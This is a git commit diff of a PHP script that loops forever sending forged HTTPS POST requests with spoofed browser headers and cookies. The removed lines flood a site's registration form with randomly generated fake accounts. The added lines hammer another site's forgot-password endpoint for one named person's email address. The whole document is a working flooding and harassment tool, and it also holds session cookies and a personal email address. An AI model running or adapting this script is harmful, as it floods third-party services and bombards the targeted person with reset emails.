5cef2d71e0d6c89e4c40f40a093c180dfe3af235
sjd89s89dd <45253797+sjd89s89dd@users.noreply.github.com>
2019-01-08 14:41:25 -0800

    Update file.php

--- file.php
+++ file.php
@@ -1,20 +1,20 @@
-$host = "accounts.4xincome.com";
-$path = "/registration.php";
+$host = "www.bluehillcapitals.com";
+$path = "/forgot-password/";
 while(1)
         {
-				$post_data = 'country=DE&state=' .genrandstring(). '&first_name=' .genrandstring(). '&last_name=' .genrandstring(). '&phone=63521' .rand(100000,999999). '&email=asuhdih' .rand(100000,999999). '%40tutanota.com&password=q1w2e3&con_password=q1w2e3&type_of_account=1&referer_code=&ib_code=&reg_type=0';
+				$post_data = 'username=brendon.miles%40mail.com';
                 $socket = fsockopen("ssl://".$host, 443, $errno, $errstr, 15);
                 $http = "POST {$path} HTTP/1.1\r\n";
                 $http .= "Host: " .$host. "\r\n";
                 $http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n";
                 $http .= "Accept: */*\r\n";
                 $http .= "Accept-Language: en-US,en;q=0.5\r\n";
-                $http .= "Referer: https://" .$host. "/registration.php\r\n";
+                $http .= "Referer: https://www.bluehillcapitals.com/forgot-password/\r\n";
                 $http .= "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n";
                 $http .= "X-Requested-With: XMLHttpRequest\r\n";
                 $http .= "Content-Length: " .strlen($post_data). "\r\n";
                 $http .= "Connection: close\r\n";
-                $http .= "Cookie: __cfduid=d4f9a7ad1fbbda06f3775688e9ca479181544621882; qtrans_front_language=en; PHPSESSID=o6kfvobo658ai5nm3jtjp92crf; TawkConnectionTime=0; cf_clearance=c1e087416e5bda4bea2b0f03c9a37d5f0889e2b3-1544637389-1800-150; __tawkuuid=e::4xincome.com::D25c8oebRs6GszGOoC0qyC+D3aWMPfuFff5vTuXtFdLhB4Ka4gI8pQksWEr3miUK::2\r\n\r\n";
+                $http .= "Cookie: rbzid=rBagxGTqt+jOSwz3FNmBb8DFjj1UFqJj385NFOuu43tB1bALF9i26zKoidpaCOBrzufCdfrV3fzOLma3OsF8tTRkf34SQQlzwlsjx+AAsCI42z6t4xS+ttcotHv+OieMyYCFlN5cm92CPvhTNbJICgWntkj97rsfvJaZlhzkfcFSNagvNwszzxIy5uf3vMn8PVIxY5hFAR37zGm6DqOq5w==; PHPSESSID=e83cffe4e9a865f7b0ece340a2b8e738\r\n\r\n";
                 $http .= $post_data . "\r\n";
 
                 fwrite($socket, $http);
@@ -26,7 +26,7 @@ while(1)
 				#echo $contents;
                 fclose($socket);
                 #echo(".");
-				logout();
+				#logout();
 
         }
 function logout()
